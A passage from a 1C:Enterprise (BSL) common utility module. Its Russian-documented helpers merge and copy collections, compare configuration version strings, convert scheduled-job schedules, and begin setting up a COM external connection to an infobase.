КонецФункции

// Дополняет таблицу значений-приемник данными из таблицы значений-источник.
//
// Параметры:
//  ТаблицаИсточник - ТаблицаЗначений - таблица, из которой будут браться строки для заполнения;
//  ТаблицаПриемник - ТаблицаЗначений - таблица, в которую будут добавлены строки из таблицы-источника.
//  
Процедура ДополнитьТаблицу(ТаблицаИсточник, ТаблицаПриемник) Экспорт
	
	Для Каждого СтрокаТаблицыИсточник Из ТаблицаИсточник Цикл
		
		ЗаполнитьЗначенияСвойств(ТаблицаПриемник.Добавить(), СтрокаТаблицыИсточник);
		
	КонецЦикла;
	
КонецПроцедуры

// Дополняет таблицу значений Таблица значениями из массива Массив.
//
// Параметры:
//  Таблица - ТаблицаЗначений - таблица, которую необходимо заполнить значениями из массива;
//  Массив  - Массив - массив значений для заполнения таблицы;
//  ИмяПоля - Строка - имя поля таблицы значений, в которое необходимо загрузить значения из массива.
// 
Процедура ДополнитьТаблицуИзМассива(Таблица, Массив, ИмяПоля) Экспорт

	Для каждого Значение Из Массив Цикл
		
		Таблица.Добавить()[ИмяПоля] = Значение;
		
	КонецЦикла;
	
КонецПроцедуры

// Дополняет массив МассивПриемник значениями из массива МассивИсточник.
//
// Параметры:
//  МассивПриемник - Массив - массив, в который необходимо добавить значения.
//  МассивИсточник - Массив - массив значений для заполнения.
//  ТолькоУникальныеЗначения - Булево - если истина, то в массив будут включены только уникальные значения.
//
Процедура ДополнитьМассив(МассивПриемник, МассивИсточник, ТолькоУникальныеЗначения = Ложь) Экспорт
	
	Если ТолькоУникальныеЗначения Тогда
		
		УникальныеЗначения = Новый Соответствие;
		
		Для Каждого Значение Из МассивПриемник Цикл
			УникальныеЗначения.Вставить(Значение, Истина);
		КонецЦикла;
		
		Для Каждого Значение Из МассивИсточник Цикл
			Если УникальныеЗначения[Значение] = Неопределено Тогда
				МассивПриемник.Добавить(Значение);
				УникальныеЗначения.Вставить(Значение, Истина);
			КонецЕсли;
		КонецЦикла;
		
	Иначе
		
		Для Каждого Значение Из МассивИсточник Цикл
			МассивПриемник.Добавить(Значение);
		КонецЦикла;
		
	КонецЕсли;
	
КонецПроцедуры

// Дополняет структуру значениями из другой структуры.
//
// Параметры:
//   Приемник - Структура - коллекция, в которую будут добавляться новые значения.
//   Источник - Структура - коллекция, из которой будут считываться пары Ключ и Значение для заполнения.
//   Заменять - Булево, Неопределено - Что делать в местах пересечения ключей источника и приемника:
//                                       Истина - Заменять значения приемника (самый быстрый способ),
//                                       Ложь   - Не заменять значения приемника (пропускать),
//                                       Неопределено - Значение по умолчанию. Бросать исключение.
//
Процедура ДополнитьСтруктуру(Приемник, Источник, Заменять = Неопределено) Экспорт
	
	Для Каждого Элемент Из Источник Цикл
		Если Заменять <> Истина И Приемник.Свойство(Элемент.Ключ) Тогда
			Если Заменять = Ложь Тогда
				Продолжить;
			Иначе
				ВызватьИсключение СтроковыеФункцииКлиентСервер.ПодставитьПараметрыВСтроку(НСтр(""ru = 'Пересечение ключей источника и приемника: """"%1"""".'""), Элемент.Ключ);
			КонецЕсли
		КонецЕсли;
		Приемник.Вставить(Элемент.Ключ, Элемент.Значение);
	КонецЦикла;
	
КонецПроцедуры

// Дополняет соответствие значениями из другого соответствия.
//
// Параметры:
//   Приемник - Соответствие - коллекция, в которую будут добавляться новые значения.
//   Источник - Соответствие - коллекция, из которой будут считываться пары Ключ и Значение для заполнения.
//   Заменять - Булево, Неопределено - Что делать в местах пересечения ключей источника и приемника:
//                                       Истина - Заменять значения приемника (самый быстрый способ),
//                                       Ложь   - Не заменять значения приемника (пропускать),
//                                       Неопределено - Значение по умолчанию. Бросать исключение.
//
Процедура ДополнитьСоответствие(Приемник, Источник, Заменять = Неопределено) Экспорт
	
	Для Каждого Элемент Из Источник Цикл
		Если Заменять <> Истина И Приемник[Элемент.Ключ] <> Неопределено Тогда
			Если Заменять = Ложь Тогда
				Продолжить;
			Иначе
				ВызватьИсключение СтроковыеФункцииКлиентСервер.ПодставитьПараметрыВСтроку(НСтр(""ru = 'Пересечение ключей источника и приемника: """"%1"""".'""), Элемент.Ключ);
			КонецЕсли
		КонецЕсли;
		Приемник.Вставить(Элемент.Ключ, Элемент.Значение);
	КонецЦикла;
	
КонецПроцедуры

// Проверяет наличие реквизита или свойства у произвольного объекта без обращения к метаданным.
//
// Параметры:
//  Объект       - Произвольный - объект, у которого нужно проверить наличие реквизита или свойства;
//  ИмяРеквизита - Строка       - имя реквизита или свойства.
//
// Возвращаемое значение:
//  Булево - Истина, если есть.
//
Функция ЕстьРеквизитИлиСвойствоОбъекта(Объект, ИмяРеквизита) Экспорт
	
	КлючУникальности   = Новый УникальныйИдентификатор;
	СтруктураРеквизита = Новый Структура(ИмяРеквизита, КлючУникальности);
	ЗаполнитьЗначенияСвойств(СтруктураРеквизита, Объект);
	
	Возврат СтруктураРеквизита[ИмяРеквизита] <> КлючУникальности;
	
КонецФункции

// Снимает один элемент условного оформления, если это список значений.
// 
// Параметры:
//  УсловноеОформление - УсловноеОформление - условное оформление элемента формы;
//  ИдентификаторПользовательскойНастройки - Строка - идентификатор настройки;
//  Значение - Произвольный -  значение, которое требуется удалить из списка оформления.
//
Процедура СнятьУсловноеОформлениеСпискаЗначений(УсловноеОформление, Знач ИдентификаторПользовательскойНастройки, 
	Знач Значение) Экспорт
	
	Для каждого ЭлементУсловногоОформления Из УсловноеОформление.Элементы Цикл
		Если ЭлементУсловногоОформления.ИдентификаторПользовательскойНастройки = ИдентификаторПользовательскойНастройки Тогда
			Если ЭлементУсловногоОформления.Отбор.Элементы.Количество() = 0 Тогда
				Возврат;
			КонецЕсли;
			ЭлементСписокОтбора = ЭлементУсловногоОформления.Отбор.Элементы[0];
			Если ЭлементСписокОтбора.ПравоеЗначение = Неопределено Тогда
				Возврат;
			КонецЕсли;
			ЭлементСписка = ЭлементСписокОтбора.ПравоеЗначение.НайтиПоЗначению(Значение);
			Если ЭлементСписка <> Неопределено Тогда
				ЭлементСписокОтбора.ПравоеЗначение.Удалить(ЭлементСписка);
			КонецЕсли;
			ЭлементСписокОтбора.ПравоеЗначение = ЭлементСписокОтбора.ПравоеЗначение;
			Возврат;
		КонецЕсли;
	КонецЦикла;
	
КонецПроцедуры

// Удаляет все вхождения переданного значения из массива.
//
// Параметры:
//  Массив - Массив - массив, из которого необходимо удалить значение;
//  Значение - Произвольный - удаляемое значение из массива.
// 
Процедура УдалитьВсеВхожденияЗначенияИзМассива(Массив, Значение) Экспорт
	
	КоличествоЭлементовКоллекции = Массив.Количество();
	
	Для ОбратныйИндекс = 1 По КоличествоЭлементовКоллекции Цикл
		
		Индекс = КоличествоЭлементовКоллекции - ОбратныйИндекс;
		
		Если Массив[Индекс] = Значение Тогда
			
			Массив.Удалить(Индекс);
			
		КонецЕсли;
		
	КонецЦикла;
	
КонецПроцедуры

// Удаляет все вхождения значений указанного типа.
//
// Параметры:
//  Массив - Массив - массив, из которого необходимо удалить значения;
//  Тип - Тип - тип значений, которые подлежат удалению из массива.
// 
Процедура УдалитьВсеВхожденияТипаИзМассива(Массив, Тип) Экспорт
	
	КоличествоЭлементовКоллекции = Массив.Количество();
	
	Для ОбратныйИндекс = 1 По КоличествоЭлементовКоллекции Цикл
		
		Индекс = КоличествоЭлементовКоллекции - ОбратныйИндекс;
		
		Если ТипЗнч(Массив[Индекс]) = Тип Тогда
			
			Массив.Удалить(Индекс);
			
		КонецЕсли;
		
	КонецЦикла;
	
КонецПроцедуры

// Удаляет одно значение из массива.
//
// Параметры:
//  Массив - Массив - массив, из которого необходимо удалить значение;
//  Значение - Массив - удаляемое значение из массива.
// 
Процедура УдалитьЗначениеИзМассива(Массив, Значение) Экспорт
	
	Индекс = Массив.Найти(Значение);
	
	Если Индекс <> Неопределено Тогда
		
		Массив.Удалить(Индекс);
		
	КонецЕсли;
	
КонецПроцедуры

// Удаляет повторяющиеся элементы массива.
//
// Параметры:
//  Массив - Массив - массив произвольных значений.
//
// Возвращаемое значение:
//  Массив - коллекция уникальных элементов.
//
Функция СвернутьМассив(Массив) Экспорт
	Результат = Новый Массив;
	ДополнитьМассив(Результат, Массив, Истина);
	Возврат Результат;
КонецФункции

// Заполняет коллекцию-приемник значениями из коллекции-источник.
// В качестве коллекций источника и приемника могут выступать типы:
// ТаблицаЗначений; ДеревоЗначений; СписокЗначений и пр.
//
// Параметры:
//  КоллекцияИсточник - ЛюбаяКоллекция - коллекция значений, которая является источником для заполнения данных;
//  КоллекцияПриемник - ЛюбаяКоллекция - коллекция значений, которая является приемником для заполнения данных.
// 
Процедура ЗаполнитьКоллекциюСвойств(КоллекцияИсточник, КоллекцияПриемник) Экспорт
	
	Для Каждого Элемент Из КоллекцияИсточник Цикл
		
		ЗаполнитьЗначенияСвойств(КоллекцияПриемник.Добавить(), Элемент);
		
	КонецЦикла;
	
КонецПроцедуры

// Получает массив значений из отмеченных элементов списка значений.
//
// Параметры:
//  Список - СписокЗначений - список значений из которого будет формироваться массив значений;
// 
// Возвращаемое значение:
//  Массив - массив значений из отмеченных элементов списка значений.
//
Функция ОтмеченныеЭлементы(Список) Экспорт
	
	// Возвращаемое значение функции.
	Массив = Новый Массив;
	
	Для Каждого Элемент Из Список Цикл
		
		Если Элемент.Пометка Тогда
			
			Массив.Добавить(Элемент.Значение);
			
		КонецЕсли;
		
	КонецЦикла;
	
	Возврат Массив;
КонецФункции

// Вычисляет разность массивов. Разностью массивов А и В является массив, содержащий
// все элементы массива А не существующие в массиве В.
//
// Параметры:
//  Массив - Массив - массив элементов, из которого необходимо выполнить вычитание;
//  МассивВычитания - Массив - массив элементов, который будет вычитаться.
// 
// Возвращаемое значение:
//  Массив - дополнение массива В до А.
//
// Пример:
//	//А = [1, 3, 5, 7];
//	//В = [3, 7, 9];
//	Результат = РазностьМассивов(А, В);
//	//Результат = [1, 5];
//
Функция РазностьМассивов(Массив, МассивВычитания) Экспорт
	
	Результат = Новый Массив;
	
	Для Каждого Элемент Из Массив Цикл
		
		Если МассивВычитания.Найти(Элемент) = Неопределено Тогда
			
			Результат.Добавить(Элемент);
			
		КонецЕсли;
		
	КонецЦикла;
	
	Возврат Результат;
	
КонецФункции

// Преобразует РасписаниеРегламентногоЗадания в структуру.
//
// Параметры:
//  Расписание - РасписаниеРегламентногоЗадания - исходное расписание.
// 
// Возвращаемое значение:
//  Структура - расписание в виде структуры.
//
Функция РасписаниеВСтруктуру(Знач Расписание) Экспорт
	
	ЗначениеРасписания = Расписание;
	Если ЗначениеРасписания = Неопределено Тогда
		ЗначениеРасписания = Новый РасписаниеРегламентногоЗадания();
	КонецЕсли;
	СписокПолей = ""ВремяЗавершения,ВремяКонца,ВремяНачала,ДатаКонца,ДатаНачала,ДеньВМесяце,ДеньНеделиВМесяце,""
		+ ""ДниНедели,ИнтервалЗавершения,Месяцы,ПаузаПовтора,ПериодНедель,ПериодПовтораВТечениеДня,ПериодПовтораДней"";
	Результат = Новый Структура(СписокПолей);
	ЗаполнитьЗначенияСвойств(Результат, ЗначениеРасписания, СписокПолей);
	ДетальныеРасписанияДня = Новый Массив;
	Для каждого РасписаниеДля Из Расписание.ДетальныеРасписанияДня Цикл
		ДетальныеРасписанияДня.Добавить(РасписаниеВСтруктуру(РасписаниеДля));
	КонецЦикла;
	Результат.Вставить(""ДетальныеРасписанияДня"", ДетальныеРасписанияДня);
	Возврат Результат;
	
КонецФункции

// Преобразует структуру в РасписаниеРегламентногоЗадания.
//
// Параметры:
//  СтруктураРасписания - Структура - расписание в виде структуры.
// 
// Возвращаемое значение:
//  РасписаниеРегламентногоЗадания - расписание.
//
Функция СтруктураВРасписание(Знач СтруктураРасписания) Экспорт
	
	Если СтруктураРасписания = Неопределено Тогда
		Возврат Новый РасписаниеРегламентногоЗадания();
	КонецЕсли;
	СписокПолей = ""ВремяЗавершения,ВремяКонца,ВремяНачала,ДатаКонца,ДатаНачала,ДеньВМесяце,ДеньНеделиВМесяце,""
		+ ""ДниНедели,ИнтервалЗавершения,Месяцы,ПаузаПовтора,ПериодНедель,ПериодПовтораВТечениеДня,ПериодПовтораДней"";
	Результат = Новый РасписаниеРегламентногоЗадания;
	ЗаполнитьЗначенияСвойств(Результат, СтруктураРасписания, СписокПолей);
	ДетальныеРасписанияДня = Новый Массив;
	Для каждого Расписание Из СтруктураРасписания.ДетальныеРасписанияДня Цикл
		ДетальныеРасписанияДня.Добавить(СтруктураВРасписание(Расписание));
	КонецЦикла;
	Результат.ДетальныеРасписанияДня = ДетальныеРасписанияДня;  
	Возврат Результат;
	
КонецФункции

// Создает полную копию структуры, соответствия, массива, списка или таблицы значений, рекурсивно, 
// с учетом типов дочерних элементов. При этом содержимое значений объектных типов 
// (СправочникОбъект, ДокументОбъект и т.п.) не копируются, а возвращаются ссылки на исходный объект.
//
// Параметры:
//  Источник - Структура, Соответствие, Массив, СписокЗначений, ТаблицаЗначений - объект, который необходимо 
//             скопировать.
//
// Возвращаемое значение:
//  Структура, Соответствие, Массив, СписокЗначений, ТаблицаЗначений - копия объекта, переданного в параметре Источник.
//
Функция СкопироватьРекурсивно(Источник) Экспорт
	
	Перем Приемник;
	
	ТипИсточника = ТипЗнч(Источник);
	
#Если Сервер Или ТолстыйКлиентОбычноеПриложение Или ВнешнееСоединение Тогда
	Если ТипИсточника = Тип(""ТаблицаЗначений"") Тогда
		Возврат Источник.Скопировать();
	КонецЕсли;
#КонецЕсли	
	Если ТипИсточника = Тип(""Структура"") Тогда
		Приемник = СкопироватьСтруктуру(Источник);
	ИначеЕсли ТипИсточника = Тип(""Соответствие"") Тогда
		Приемник = СкопироватьСоответствие(Источник);
	ИначеЕсли ТипИсточника = Тип(""Массив"") Тогда
		Приемник = СкопироватьМассив(Источник);
	ИначеЕсли ТипИсточника = Тип(""СписокЗначений"") Тогда
		Приемник = СкопироватьСписокЗначений(Источник);
	Иначе
		Приемник = Источник;
	КонецЕсли;
	
	Возврат Приемник;
	
КонецФункции

// Создает копию значения типа Структура, рекурсивно, с учетом типов значений свойств. 
// Если свойства структуры содержат значения объектных типов (СправочникОбъект, ДокументОбъект и т.п.),
// то их содержимое не копируются, а возвращаются ссылки на исходный объект.
//
// Параметры:
//  СтруктураИсточник - Структура - копируемая структура.
// 
// Возвращаемое значение:
//  Структура - копия исходной структуры.
//
Функция СкопироватьСтруктуру(СтруктураИсточник) Экспорт
	
	СтруктураРезультат = Новый Структура;
	
	Для Каждого КлючИЗначение Из СтруктураИсточник Цикл
		СтруктураРезультат.Вставить(КлючИЗначение.Ключ, СкопироватьРекурсивно(КлючИЗначение.Значение));
	КонецЦикла;
	
	Возврат СтруктураРезультат;
	
КонецФункции

// Создает копию значения типа Соответствие, рекурсивно, с учетом типов значений.
// Если значения соответствия содержат значения объектных типов (СправочникОбъект, ДокументОбъект и т.п.),
// то их содержимое не копируются, а возвращаются ссылки на исходный объект.
//
// Параметры:
//  СоответствиеИсточник - Соответствие - соответствие, копию которого необходимо получить.
// 
// Возвращаемое значение:
//  Соответствие - копия исходного соответствия.
//
Функция СкопироватьСоответствие(СоответствиеИсточник) Экспорт
	
	СоответствиеРезультат = Новый Соответствие;
	
	Для Каждого КлючИЗначение Из СоответствиеИсточник Цикл
		СоответствиеРезультат.Вставить(КлючИЗначение.Ключ, СкопироватьРекурсивно(КлючИЗначение.Значение));
	КонецЦикла;
	
	Возврат СоответствиеРезультат;

КонецФункции

// Создает копию значения типа Массив, рекурсивно, с учетом типов значений элементов массива.
// Если элементы массива содержат значения объектных типов (СправочникОбъект, ДокументОбъект и т.п.),
// то их содержимое не копируются, а возвращаются ссылки на исходный объект.
//
// Параметры:
//  МассивИсточник - Массив - массив, копию которого необходимо получить.
// 
// Возвращаемое значение:
//  Массив - копия исходного массива.
//
Функция СкопироватьМассив(МассивИсточник) Экспорт
	
	МассивРезультат = Новый Массив;
	
	Для Каждого Элемент Из МассивИсточник Цикл
		МассивРезультат.Добавить(СкопироватьРекурсивно(Элемент));
	КонецЦикла;
	
	Возврат МассивРезультат;
	
КонецФункции

// Создает копию значения типа СписокЗначений, рекурсивно, с учетом типов его значений.
// Если в списке значений есть значения объектных типов (СправочникОбъект, ДокументОбъект и т.п.),
// то их содержимое не копируются, а возвращаются ссылки на исходный объект.
//
// Параметры:
//  СписокИсточник - СписокЗначений - список значений, копию которого необходимо получить.
// 
// Возвращаемое значение:
//  СписокЗначений - копия исходного списка значений.
//
Функция СкопироватьСписокЗначений(СписокИсточник) Экспорт
	
	СписокРезультат = Новый СписокЗначений;
	
	Для Каждого ЭлементСписка Из СписокИсточник Цикл
		СписокРезультат.Добавить(
			СкопироватьРекурсивно(ЭлементСписка.Значение), 
			ЭлементСписка.Представление, 
			ЭлементСписка.Пометка, 
			ЭлементСписка.Картинка);
	КонецЦикла;
	
	Возврат СписокРезультат;
	
КонецФункции

// Сравнивает элементы списков значений или массивов по значениям.
//
// Параметры:
//  Список1 - Массив, СписокЗначений - сравниваемая коллекция элементов.
//  Список2 - Массив, СписокЗначений - сравниваемая коллекция элементов.
//
// Возвращаемое значение:
//  Булево - Истина, если идентичны.
//
Функция СпискиЗначенийИдентичны(Список1, Список2) Экспорт
	
	СпискиИдентичны = Истина;
	
	Для Каждого ЭлементСписка1 Из Список1 Цикл
		Если НайтиВСписке(Список2, ЭлементСписка1) = Неопределено Тогда
			СпискиИдентичны = Ложь;
			Прервать;
		КонецЕсли;
	КонецЦикла;
	
	Если СпискиИдентичны Тогда
		Для Каждого ЭлементСписка2 Из Список2 Цикл
			Если НайтиВСписке(Список1, ЭлементСписка2) = Неопределено Тогда
				СпискиИдентичны = Ложь;
				Прервать;
			КонецЕсли;
		КонецЦикла;
	КонецЕсли;
	
	Возврат СпискиИдентичны;
	
КонецФункции

// Создает массив и помещает в него переданное значение.
//
// Параметры:
//  Значение - Произвольный - любое значение.
//
// Возвращаемое значение:
//  Массив - массив из одного элемента.
//
Функция ЗначениеВМассиве(Значение) Экспорт
	
	Массив = Новый Массив;
	Массив.Добавить(Значение);
	
	Возврат Массив;
	
КонецФункции

// Процедура управляет состояние поля табличного документа.
//
// Параметры:
//  ПолеТабличногоДокумента - ПолеФормы - поле формы с видом ПолеТабличногоДокумента,
//                            для которого необходимо установить состояние.
//  Состояние               - Строка - задает вид состояния.
//
Процедура УстановитьСостояниеПоляТабличногоДокумента(ПолеТабличногоДокумента, Состояние = ""НеИспользовать"") Экспорт
	
	Если ТипЗнч(ПолеТабличногоДокумента) = Тип(""ПолеФормы"") 
		И ПолеТабличногоДокумента.Вид = ВидПоляФормы.ПолеТабличногоДокумента Тогда
		ОтображениеСостояния = ПолеТабличногоДокумента.ОтображениеСостояния;
		Если ВРег(Состояние) = ""НЕИСПОЛЬЗОВАТЬ"" Тогда
			ОтображениеСостояния.Видимость                      = Ложь;
			ОтображениеСостояния.ДополнительныйРежимОтображения = ДополнительныйРежимОтображения.НеИспользовать;
			ОтображениеСостояния.Картинка                       = Новый Картинка;
			ОтображениеСостояния.Текст                          = """";
		ИначеЕсли ВРег(Состояние) = ""НЕАКТУАЛЬНОСТЬ"" Тогда
			ОтображениеСостояния.Видимость                      = Истина;
			ОтображениеСостояния.ДополнительныйРежимОтображения = ДополнительныйРежимОтображения.Неактуальность;
			ОтображениеСостояния.Картинка                       = Новый Картинка;
			ОтображениеСостояния.Текст                          = НСтр(""ru = 'Отчет не сформирован. Нажмите """"Сформировать"""" для получения отчета.'"");;
		ИначеЕсли ВРег(Состояние) = ""ФОРМИРОВАНИЕОТЧЕТА"" Тогда  
			ОтображениеСостояния.Видимость                      = Истина;
			ОтображениеСостояния.ДополнительныйРежимОтображения = ДополнительныйРежимОтображения.Неактуальность;
			ОтображениеСостояния.Картинка                       = БиблиотекаКартинок.ДлительнаяОперация48;
			ОтображениеСостояния.Текст                          = НСтр(""ru = 'Отчет формируется...'"");
		Иначе
			ВызватьИсключение(НСтр(""ru = 'Недопустимое значение параметра (параметр номер ''2'')'""));
		КонецЕсли;
	Иначе
		ВызватьИсключение(НСтр(""ru = 'Недопустимое значение параметра (параметр номер ''1'')'""));
	КонецЕсли;
	
КонецПроцедуры

// Получает номер версии конфигурации без номера сборки.
//
// Параметры:
//  Версия - Строка - версия конфигурации в формате РР.ПП.ЗЗ.СС,
//                    где СС - номер сборки, который будет удален.
// 
// Возвращаемое значение:
//  Строка - номер версии конфигурации без номера сборки в формате РР.ПП.ЗЗ.
//
Функция ВерсияКонфигурацииБезНомераСборки(Знач Версия) Экспорт
	
	Массив = СтрРазделить(Версия, ""."");
	
	Если Массив.Количество() < 3 Тогда
		Возврат Версия;
	КонецЕсли;
	
	Результат = ""[Редакция].[Подредакция].[Релиз]"";
	Результат = СтрЗаменить(Результат, ""[Редакция]"",    Массив[0]);
	Результат = СтрЗаменить(Результат, ""[Подредакция]"", Массив[1]);
	Результат = СтрЗаменить(Результат, ""[Релиз]"",       Массив[2]);
	
	Возврат Результат;
КонецФункции

// Сравнить две строки версий.
//
// Параметры:
//  СтрокаВерсии1  - Строка - номер версии в формате РР.{П|ПП}.ЗЗ.СС.
//  СтрокаВерсии2  - Строка - второй сравниваемый номер версии.
//
// Возвращаемое значение:
//   Число   - больше 0, если СтрокаВерсии1 > СтрокаВерсии2; 0, если версии равны.
//
Функция СравнитьВерсии(Знач СтрокаВерсии1, Знач СтрокаВерсии2) Экспорт
	
	Строка1 = ?(ПустаяСтрока(СтрокаВерсии1), ""0.0.0.0"", СтрокаВерсии1);
	Строка2 = ?(ПустаяСтрока(СтрокаВерсии2), ""0.0.0.0"", СтрокаВерсии2);
	Версия1 = СтрРазделить(Строка1, ""."");
	Если Версия1.Количество() <> 4 Тогда
		ВызватьИсключение СтроковыеФункцииКлиентСервер.ПодставитьПараметрыВСтроку(
			НСтр(""ru = 'Неправильный формат параметра СтрокаВерсии1: %1'""), СтрокаВерсии1);
	КонецЕсли;
	Версия2 = СтрРазделить(Строка2, ""."");
	Если Версия2.Количество() <> 4 Тогда
		ВызватьИсключение СтроковыеФункцииКлиентСервер.ПодставитьПараметрыВСтроку(
	    	НСтр(""ru = 'Неправильный формат параметра СтрокаВерсии2: %1'""), СтрокаВерсии2);
	КонецЕсли;
	
	Результат = 0;
	Для Разряд = 0 По 3 Цикл
		Результат = Число(Версия1[Разряд]) - Число(Версия2[Разряд]);
		Если Результат <> 0 Тогда
			Возврат Результат;
		КонецЕсли;
	КонецЦикла;
	Возврат Результат;
	
КонецФункции

// Сравнить две строки версий.
//
// Параметры:
//  СтрокаВерсии1  - Строка - номер версии в формате РР.{П|ПП}.ЗЗ.
//  СтрокаВерсии2  - Строка - второй сравниваемый номер версии.
//
// Возвращаемое значение:
//   Число   - больше 0, если СтрокаВерсии1 > СтрокаВерсии2; 0, если версии равны.
//
Функция СравнитьВерсииБезНомераСборки(Знач СтрокаВерсии1, Знач СтрокаВерсии2) Экспорт
	
	Строка1 = ?(ПустаяСтрока(СтрокаВерсии1), ""0.0.0"", СтрокаВерсии1);
	Строка2 = ?(ПустаяСтрока(СтрокаВерсии2), ""0.0.0"", СтрокаВерсии2);
	Версия1 = СтрРазделить(Строка1, ""."");
	Если Версия1.Количество() <> 3 Тогда
		ВызватьИсключение СтроковыеФункцииКлиентСервер.ПодставитьПараметрыВСтроку(
			НСтр(""ru = 'Неправильный формат параметра СтрокаВерсии1: %1'""), СтрокаВерсии1);
	КонецЕсли;
	Версия2 = СтрРазделить(Строка2, ""."");
	Если Версия2.Количество() <> 3 Тогда
		ВызватьИсключение СтроковыеФункцииКлиентСервер.ПодставитьПараметрыВСтроку(
	    	НСтр(""ru = 'Неправильный формат параметра СтрокаВерсии2: %1'""), СтрокаВерсии2);
	КонецЕсли;
	
	Результат = 0;
	Для Разряд = 0 По 2 Цикл
		Результат = Число(Версия1[Разряд]) - Число(Версия2[Разряд]);
		Если Результат <> 0 Тогда
			Возврат Результат;
		КонецЕсли;
	КонецЦикла;
	Возврат Результат;
	
КонецФункции

// Получает строку, содержащую ключи структуры, разделенные символом разделителя.
//
// Параметры:
//	Структура - Структура - Структура, ключи которой преобразуются в строку.
//	Разделитель - Строка - Разделитель, который вставляется в строку между ключами структуры.
//
// Возвращаемое значение:
//	Строка - Строка, содержащая ключи структуры разделенные разделителем.
//
Функция КлючиСтруктурыВСтроку(Структура, Разделитель = "","") Экспорт
	
	Результат = """";
	
	Для Каждого Элемент Из Структура Цикл
		СимволРазделителя = ?(ПустаяСтрока(Результат), """", Разделитель);
		Результат = Результат + СимволРазделителя + Элемент.Ключ;
	КонецЦикла;
	
	Возврат Результат;
	
КонецФункции

// Возвращает значение свойства структуры.
//
// Параметры:
//   Структура - Структура, ФиксированнаяСтруктура - Объект, из которого необходимо прочитать значение ключа.
//   Ключ - Строка - Имя свойства структуры, для которого необходимо прочитать значение.
//   ЗначениеПоУмолчанию - Произвольный - Необязательный. Возвращается когда в структуре нет значения по указанному
//                                        ключу.
//       Для скорости рекомендуется передавать только быстро вычисляемые значения (например примитивные типы),
//       а инициализацию более тяжелых значений выполнять после проверки полученного значения (только если это
//       требуется).
//
// Возвращаемое значение:
//   Произвольный - Значение свойства структуры. ЗначениеПоУмолчанию если в структуре нет указанного свойства.
//
Функция СвойствоСтруктуры(Структура, Ключ, ЗначениеПоУмолчанию = Неопределено) Экспорт
	
	Если Структура = Неопределено Тогда
		Возврат ЗначениеПоУмолчанию;
	КонецЕсли;
	
	Результат = ЗначениеПоУмолчанию;
	Если Структура.Свойство(Ключ, Результат) Тогда
		Возврат Результат;
	Иначе
		Возврат ЗначениеПоУмолчанию;
	КонецЕсли;
	
КонецФункции

// Возвращает имя COM-класса для работы с 1С:Предприятием 8 через COM-соединение.
//
// Возвращаемое значение:
//  Строка - имя COM-класса для работы с 1С:Предприятием 8 через COM-соединение.
//
Функция ИмяCOMСоединителя() Экспорт
	СистемнаяИнфо = Новый СистемнаяИнформация;
	ПодстрокиВерсии = СтрРазделить(СистемнаяИнфо.ВерсияПриложения, ""."");
	Возврат ""v"" + ПодстрокиВерсии[0] + ПодстрокиВерсии[1] + "".COMConnector"";
КонецФункции

// Устанавливает внешнее соединение с информационной базой по переданным параметрам подключения и возвращает указатель
// на это соединение.
// 
// Параметры:
//  Параметры - Структура - параметры для установки внешнего соединения с информационной базой.
//                          Свойства см. в функции
//                          ОбщегоНазначенияКлиентСервер.СтруктураПараметровДляУстановкиВнешнегоСоединения):
//
//    * ВариантРаботыИнформационнойБазы             - Число - Вариант работы информационной базы: 0 - файловый; 1 -
//                                                            клиент-серверный;
//    * КаталогИнформационнойБазы                   - Строка - Каталог информационной базы для файлового режима работы;
//    * ИмяСервера1СПредприятия                     - Строка - Имя сервера1С:Предприятия;
//    * ИмяИнформационнойБазыНаСервере1СПредприятия - Строка - Имя информационной базы на сервере1С:Предприятия;
//    * АутентификацияОперационнойСистемы           - Булево - Признак аутентификации операционной системы при создании
//                                                             внешнего подключения к информационной базе;
//    * ИмяПользователя                             - Строка - Имя пользователя информационной базы;
//    * ПарольПользователя                          - Строка - Пароль пользователя информационной базы.
// 
//  СтрокаСообщенияОбОшибке - Строка - если в процессе установки внешнего соединения возникает ошибка,
//                                     то подробное описание ошибки помещается в этот параметр.
//  ОшибкаПодключенияКомпоненты - Булево - (возвращаемый параметр) устанавливается Истина, если была ошибка при подключении.
//
// Возвращаемое значение:
//  COMОбъект, Неопределенно - в случае успешной установки внешнего соединения возвращается указатель на COM-объект соединения;
//    в случае ошибки возвращается Неопределенно.
//
Функция УстановитьВнешнееСоединение(Параметры, СтрокаСообщенияОбОшибке = """", ОшибкаПодключенияКомпоненты = Ложь) Экспорт
	Результат = УстановитьВнешнееСоединениеСБазой(Параметры);
	ОшибкаПодключенияКомпоненты = Результат.ОшибкаПодключенияКомпоненты;
	СтрокаСообщенияОбОшибке     = Результат.ПодробноеОписаниеОшибки;
	
	Возврат Результат.Соединение;
КонецФункции

// Устанавливает внешнее соединение с информационной базой по переданным параметрам подключения и возвращает указатель
// на это соединение.
// 
// Параметры:
//  Параметры - Структура - параметры для установки внешнего соединения с информационной базой.
//                          Свойства см. в функции
//                          ОбщегоНазначенияКлиентСервер.СтруктураПараметровДляУстановкиВнешнегоСоединения):
//
//   * ВариантРаботыИнформационнойБазы             - Число  - Вариант работы информационной базы: 0 - файловый; 1 -
//                                                            клиент-серверный;
//   * КаталогИнформационнойБазы                   - Строка - Каталог информационной базы для файлового режима работы;
//   * ИмяСервера1СПредприятия                     - Строка - Имя сервера1С:Предприятия;
//   * ИмяИнформационнойБазыНаСервере1СПредприятия - Строка - Имя информационной базы на сервере1С:Предприятия;
//   * АутентификацияОперационнойСистемы           - Булево - Признак аутентификации операционной системы при создании
//                                                            внешнего подключения к информационной базе;
//   * ИмяПользователя                             - Строка - Имя пользователя информационной базы;
//   * ПарольПользователя                          - Строка - Пароль пользователя информационной базы.
// 
// Возвращаемое значение:
//  Структура - информация о соединении:
//    * Соединение                  - COMОбъект, Неопределено - указатель на COM-объект соединения или Неопределено в
//                                    случае ошибки;
//    * КраткоеОписаниеОшибки       - Строка - краткое описание ошибки;
//    * ПодробноеОписаниеОшибки     - Строка - подробное описание ошибки;
//    * ОшибкаПодключенияКомпоненты - Булево - флаг ошибки подключения COM.
//
Функция УстановитьВнешнееСоединениеСБазой(Параметры) Экспорт
	
	Результат = Новый Структура;
	Результат.Вставить(""Соединение"");
	Результат.Вставить(""КраткоеОписаниеОшибки"", """");
	Результат.Вставить(""ПодробноеОписаниеОшибки"", """");
	Результат.Вставить(""ОшибкаПодключенияКомпоненты"", Ложь);
	
	#Если Сервер Или ТолстыйКлиентОбычноеПриложение Или ВнешнееСоединение Тогда
		ПодключениеНедоступно = ОбщегоНазначения.ЭтоLinuxСервер();
